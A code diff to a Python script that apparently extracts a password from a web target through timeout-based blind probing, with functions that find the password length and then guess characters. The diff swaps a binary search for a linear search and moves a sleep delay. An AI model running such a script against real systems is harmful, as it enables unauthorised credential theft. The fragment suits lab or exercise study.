@@ -32,8 +32,8 @@ def make_request(url:str,
             return False
     except:
         ret_val = True
+        sleep(1.1)
     
-    sleep(1.1)
     return ret_val
 
 def determine_password_length(url:str, timeout=10):
@@ -122,10 +122,10 @@ def binary_search_determine_password(url:str, password_len:int, timeout:int=10):
         print("PASSWORD: " + password)
     return password
 
-
-
 url:str = parse_args()
 timeout = 5
-password = binary_search_determine_password(url=url, 
-                                            password_len=determine_password_length(url=url, timeout=timeout),
-                                            timeout=timeout)
+
+password   = linear_search_determine_password(url=url, password_len=determine_password_length(url, timeout), timeout=timeout)
+# password = binary_search_determine_password(url=url, 
+#                                             password_len=determine_password_length(url=url, timeout=timeout),
+#                                             timeout=timeout)
